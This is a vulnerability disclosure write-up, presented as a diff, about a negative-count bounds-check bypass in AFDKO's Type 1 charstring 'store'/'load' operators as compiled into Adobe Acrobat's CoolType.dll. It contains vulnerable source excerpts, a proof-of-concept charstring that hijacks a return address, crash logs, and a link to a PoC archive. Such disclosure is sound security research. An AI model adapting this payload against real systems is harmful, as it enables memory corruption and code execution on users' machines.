@@ -1,0 +1,205 @@
+-----=====[ Background ]=====-----
+
+AFDKO (Adobe Font Development Kit for OpenType) is a set of tools for examining, modifying and building fonts. The core part of this toolset is a font handling library written in C, which provides interfaces for reading and writing Type 1, OpenType, TrueType (to some extent) and several other font formats. While the library existed as early as 2000, it was open-sourced by Adobe in 2014 on GitHub [1, 2], and is still actively developed. The font parsing code can be generally found under afdko/c/public/lib/source/*read/*.c in the project directory tree.
+
+We have recently discovered that parts of AFDKO are compiled in in Adobe's desktop software such as Adobe Acrobat. Within a single installation of Acrobat, we have found traces of AFDKO in four different libraries: acrodistdll.dll, Acrobat.dll, CoolType.dll and AdobePDFL.dll. According to our brief analysis, AFDKO is not used for font rasterization (there is a different engine for that), but rather for the conversion between font formats. For example, it is possible to execute the AFDKO copy in CoolType.dll by opening a PDF file with an embedded font, and exporting it to a PostScript (.ps) or Encapsulated PostScript (.eps) document. It is uncertain if the AFDKO copies in other libraries are reachable as an attack surface and how.
+
+It is also interesting to note that the AFDKO copies in the above DLLs are much older than the latest version of the code on GitHub. This can be easily recognized thanks to the fact that each component of the library (e.g. the Type 1 Reader - t1r, Type 1 Writer - t1w, CFF reader - cfr etc.) has its own version number included in the source code, and they change over time. For example, CoolType's version of the "cfr" module is 2.0.44, whereas the first open-sourced commit of AFDKO from September 2014 has version 2.0.46 (currently 2.1.0), so we can conclude that the CoolType fork is at least about ~5 years old. Furthermore, the forks in Acrobat.dll and AdobePDFL.dll are even older, with a "cfr" version of 2.0.31.
+
+Despite the fact that CoolType contains an old fork of the library, it includes multiple non-public fixes for various vulnerabilities, particularly a number of important bounds checks in read*() functions declared in cffread/cffread.c (e.g. readFDSelect, readCharset etc.). These checks were first introduced in CoolType.dll shipped with Adobe Reader 9.1.2, which was released on 28 May 2009. This means that the internal fork of the code has had many bugs fixed for the last 10 years, which are still not addressed in the open-source branch of the code. Nevertheless, we found more security vulnerabilities which affect the AFDKO used by CoolType, through analysis of the publicly available code. This report describes one such issue reachable through the Adobe Acrobat file export functionality.
+
+-----=====[ Description ]=====-----
+
+The "Type 2 Charstring Format" specification from 5 May 1998 introduced two storage operators: store and load, which were both deprecated in the next iteration of the specs in 2000. These operators were responsible for copying data between the transient array (also known as the BuildCharArray, or BCA) and the so-called "Registry object".
+
+As the document stated:
+
+"""
+    The Registry provides more permanent storage for a number of items that have predefined meanings. The items stored in the Registry do not persist beyond the scope of rendering a font. Registry items are selected with an index, thus:
+
+    0 Weight Vector
+    1 Normalized Design Vector
+    2 User Design Vector
+
+    The result of selecting a Registry item with an index outside this list is undefined.
+"""
+
+The Type 1 CharString interpreter implemented in t1Decode() (c/public/lib/source/t1cstr/t1cstr.c) supports the load and store operators:
+
+--- cut ---
+  1450                      case t1_store:
+  1451                          result = do_store(h);
+  1452                          if (result)
+  1453                              return result;
+  1454                          continue;
+[...]
+  1470                      case t1_load:
+  1471                          result = do_load(h);
+  1472                          if (result)
+  1473                              return result;
+  1474                          continue;
+--- cut ---
+
+The do_store() and do_load() functions are as follows:
+
+--- cut ---
+   664  /* Select registry item. Return NULL on invalid selector. */
+   665  static float *selRegItem(t1cCtx h, int reg, int *size) {
+   666      switch (reg) {
+   667          case T1_REG_WV:
+   668              *size = T1_MAX_MASTERS;
+   669              return h->aux->WV;
+   670          case T1_REG_NDV:
+   671              *size = T1_MAX_AXES;
+   672              return h->aux->NDV;
+   673          case T1_REG_UDV:
+   674              *size = T1_MAX_AXES;
+   675              return h->aux->UDV;
+   676      }
+   677      return NULL;
+   678  }
+   679
+   680  /* Execute "store" op. Return 0 on success else error code. */
+   681  static int do_store(t1cCtx h) {
+   682      int size;
+   683      int count;
+   684      int i;
+   685      int j;
+   686      int reg;
+   687      float *array;
+   688
+   689      CHKUFLOW(4);
+   690
+   691      count = (int)POP();
+   692      i = (int)POP();
+   693      j = (int)POP();
+   694      reg = (int)POP();
+   695      array = selRegItem(h, reg, &size);
+   696
+   697      if (array == NULL ||
+   698          i < 0 || i + count + 1 >= TX_BCA_LENGTH ||
+   699          j < 0 || j + count + 1 >= size)
+   700          return t1cErrStoreBounds;
+   701
+   702      memcpy(&array[j], &h->BCA[i], sizeof(float) * count);
+   703      return 0;
+   704  }
+   705
+[...]
+   736
+   737  /* Execute "load" op. Return 0 on success else error code. */
+   738  static int do_load(t1cCtx h) {
+   739      int size;
+   740      int count;
+   741      int i;
+   742      int reg;
+   743      float *array;
+   744
+   745      CHKUFLOW(3);
+   746
+   747      count = (int)POP();
+   748      i = (int)POP();
+   749      reg = (int)POP();
+   750      array = selRegItem(h, reg, &size);
+   751
+   752      if (i < 0 || i + count - 1 >= TX_BCA_LENGTH || count > size)
+   753          return t1cErrLoadBounds;
+   754
+   755      memcpy(&h->BCA[i], array, sizeof(float) * count);
+   756
+   757      return 0;
+   758  }
+--- cut ---
+
+While both routines try to enforce proper bounds of the indexes and lengths (lines 697-700 and 752-753), they miss one important corner case -- negative count. When a value smaller than 0 is specified for "count", many of the other sanity checks can be bypassed, and out-of-bounds read/write access can be triggered with a high degree of control over what is copied where. The condition is especially dangerous in x86 builds, where a controlled 32-bit index added to a memory pointer can address the entire process address space. At the time of this writing, Adobe Acrobat for Windows is available as a 32-bit build only.
+
+To give an example, setting count to a value in the range of 0x80000000-0xbfffffff makes it possible to set the "sizeof(float) * count" expression evaluate to an arbitrary multiple of 4 (0, 4, 8, ..., 0xfffffff8), enabling us to copy any chosen number of bytes in lines 702 and 755. At the same time, the value is so small that it bypasses all checks where "i + count" and "j + count" are involved for i, j in the range of 0-0x3fffffff, which also enables us to refer to the entire address space relative to the referenced buffer.
+
+To summarize, we can copy an arbitrary number of bytes between h->BCA[] and the registry arrays at arbitrary offsets, which is a powerful primitive. There is only one obstacle -- the fact that values on the interpreter stack are stored as 32-bit floats, which means they have a 23-bit mantissa. For this reason, it is impossible to precisely control the integer values of i, j and count, if they are in the order of 2^30 or 2^31. The granularity is 128 for numbers around 2^30 and 256 for numbers around 2^31, so for example it is impossible to set i to 0x3fffffff or count to 0x80000001; the closest values are 0x3fffff80/0x40000000 and 0x80000000/0x80000100, respectively. In practice, this means that we can only copy out-of-bounds memory in chunks of 512 bytes (4 * 128) or 1024 under specific conditions, and that we can only choose negative offsets relative to BCA/array which are divisible by 128. On the other hand, if we set count to a largely negative value (e.g. -1073741696), we can set i and j to fully controlled (small) positive numbers.
+
+The h->BCA[] array is stored within the t1cCtx structure in the stack frame of the t1cParse() function. The registry arrays reside within t1cAuxData structures allocated on the heap. As a result, the vulnerability gives us out-of-bounds access to both the stack and heap. An attacker could target generic data in memory related to the control flow such as return addresses, or application-specific data inside t1cCtx/t1cAuxData, which also contain many sensitive fields such as function pointers etc.
+
+As a side note, the do_load() routine doesn't verify that array != NULL, which may result in a) operating on an uninitialized "size" variable in line 752, and b) passing NULL as the source parameter to memcpy() in line 755.
+
+-----=====[ Invalid memcpy_s usage ]=====-----
+
+We also wanted to point out another interesting bug in AFDKO, which is not present in the GitHub repository but can be found in CoolType. The latter build of the code uses safe variants of many standard functions, such as memcpy_s() instead of memcpy(), vsprintf_s() instead of vsprintf() etc. The memcpy() call in do_store() was also converted to memcpy_s(), and currently looks like this in decompiled form:
+
+--- cut ---
+  memcpy_s(&array[j], 4 - 4 * j, (char *)h + 4 * i + 916, 4 * count);
+--- cut ---
+
+which can be translated to:
+
+--- cut ---
+  memcpy_s(&array[j], sizeof(array) - sizeof(float) * j, &h->BCA[i], sizeof(float) * count);
+--- cut ---
+
+Note the second argument, which is supposed to be the length of the buffer being copied to. Judging by the code the author meant to set it to the number of available bytes from element "j" to the end of the array, but used the sizeof(array) expression instead of the actual length stored in the "size" variable. In this case sizeof(array) is the size of a pointer and evaluates to 4 or 8, which is nowhere near the actual size of the array (16 or 64 depending on the register). Consequently, this bug effectively blocks access to the element at array[1] for j={0, 1}, and is incorrectly set to a huge unsigned value for j >= 2, rendering it ineffective.
+
+Considering that the 2nd "destsz" memcpy_s argument is not supposed to be a security boundary but just a safety net, and proper sanitization of the i, j, count values should prevent any kind of out-of-bounds access, we don't consider this a separate vulnerability. We are reporting it here as FYI.
+
+-----=====[ Proof of Concept ]=====-----
+
+The proof of concept is a PDF file with an embedded Type 1 font, which includes the following payload in the CharString of the "A" character:
+
+--- cut ---
+     1  1621139584 134217728 div
+     2  dup 0 put
+     3  dup 1 put
+     4  dup 2 put
+     5  dup 3 put
+     6  dup 4 put
+     7  dup 5 put
+     8  dup 6 put
+     9  dup 7 put
+    10  dup 8 put
+    11  dup 9 put
+    12  dup 10 put
+    13  dup 11 put
+    14  0 2 0 12 store
+    15  0 67
+    16  4096 4096 -64 mul mul 128 add
+    17  load
+    18  endchar
+--- cut ---
+
+A brief description:
+
+- Line 1 constructs a float on the stack with a binary representation of 0x41414141
+- Lines 2-13 copy this value to the BuildCharArray at indexes 0-11
+- Line 14 copies the 12 values from BCA to the registry #0 starting with index #2 (due to the memcpy_s bug)
+- Lines 15-17 call the "load" operator with arguments reg=0, i=67, count=0xc0000080 (-1073741696). This results in copying 0x200 (0xc0000080 * 4) bytes from registry #0 to &h->BCA[67], which points to the return address of the t2cParse() function on the stack.
+- Line 18 uses the "endchar" operator to return from the interpreter and use the overwritten return address, crashing at address 0x41414141.
+
+-----=====[ Crash logs ]=====-----
+
+When the poc.pdf file is opened with Adobe Acrobat Pro and converted to a PostScript document via "File > Export To > (Encapsulated) PostScript", the following crash occurs in Acrobat.exe:
+
+--- cut ---
+(2b10.3acc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=0d3993bc edx=00000200 esi=0daec260 edi=0d3992b8
+eip=41414141 esp=0133a07c ebp=01000100 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210297
+41414141 ??              ???
+0:000> dd esp
+0133a07c  41414141 41414141 41414141 41414141
+0133a08c  41414141 41414141 41414141 41414141
+0133a09c  41414141 41414141 41414141 0dfd96a0
+0133a0ac  0dfd96a0 00000004 ffffffff 00000000
+0133a0bc  00000001 66751a2a 00000000 d4385860
+0133a0cc  94000400 801f0014 21ec2020 10693aea
+0133a0dc  0008dda2 9d30302b 8071001e 00000000
+0133a0ec  00000000 acc70000 32027007 d2aa11d1
+--- cut ---
+
+-----=====[ References ]=====-----
+
+[1] https://blog.typekit.com/2014/09/19/new-from-adobe-type-open-sourced-font-development-tools/
+[2] https://github.com/adobe-type-tools/afdko
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47259.zip
